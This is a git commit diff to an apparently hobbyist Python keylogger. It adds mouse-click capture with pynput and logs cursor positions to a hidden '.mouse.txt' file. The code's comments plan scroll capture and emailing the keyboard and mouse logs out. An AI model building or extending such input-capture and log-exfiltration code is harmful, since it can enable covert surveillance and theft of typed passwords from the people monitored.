cbd5c944f02f574ba634b1a837590ef5573b36dc
DhyeyLukhi <dhyeylukhi95@gmail.com>
2025-08-08 00:15:41 +0530

    A new function added for monitoring and capturing the mouse position while clikc and general use, and it's working too

--- Key Logged/keylogged.py
+++ Key Logged/keylogged.py
@@ -3,6 +3,7 @@ import pyautogui
 import time
 import threading
 import datetime
+import pynput
 
 def recordKeys():
     while True:
@@ -19,32 +20,42 @@ def mouseMonitor():
     size = pyautogui.size()
     with open('.mouse.txt', 'w') as file:
         file.write(f"Size: {size.width}x{size.height} \n")
+    Xcopy, Ycopy = 0, 0
     
     while True:
         position = pyautogui.position()
-        with open('.mouse.txt', 'a') as file:
-            clocktime = datetime.datetime.now().strftime("%r")
-            file.write(f"Mouse Position: X: {position.x}   Y:{position.y}  At {clocktime}\n")
-            time.sleep(0.2)
+        if position.x != Xcopy or position.y != Ycopy:
+            with open('.mouse.txt', 'a') as file:
+                clocktime = datetime.datetime.now().strftime("%r")
+                file.write(f"Mouse Position: X: {position.x}   Y:{position.y}  At {clocktime}\n")
+                Xcopy, Ycopy = position.x, position.y
+                time.sleep(0.2)
+    
 
+def clickcheck(x, y, button, pressed, injected):
+    if pressed:
+        clocktime = datetime.datetime.now().strftime("%r")
+        print(f"{button}  X:{x}  Y:{y}  at {clocktime}")
+    
 
 if __name__ == "__main__":
     print("Hello user...")
     print("I want to record some keys from your keyboard")
-    # time.sleep(3)
     keyboardThread = threading.Thread(target=recordKeys)
     mouseThread = threading.Thread(target=mouseMonitor)
 
     keyboardThread.start()
     mouseThread.start()
-    keyboardThread.join()
-    mouseThread.join()
+
+    with pynput.mouse.Listener(on_click=clickcheck) as listen:
+        keyboardThread.join()
+        mouseThread.join()
+        listen.join()
 
 
 
+# A new function is added to check the mouse click position and it is sucessfully working
+# Now using the snippets, get the mouse scroll options and implement it in the code and then get the keyboard and mouse logs via email
 
 
-# if i have to write soemthing on the user console then use the pyautogui.write function instead of keyboard.write (use keyboard.wrte to get a feel like chatgpt is writing in the console)
-
-
-# Implementation: Add the mouse monitoring so whenever user clicks, the mouse position got noted, also add this for scrolling, and sending the key logs and click logs via mail
+# DON'T FORGOT TO ADD THE TRY AND EXCEPT BLOCK FOR ERROR HANDLING AND RESOLVING
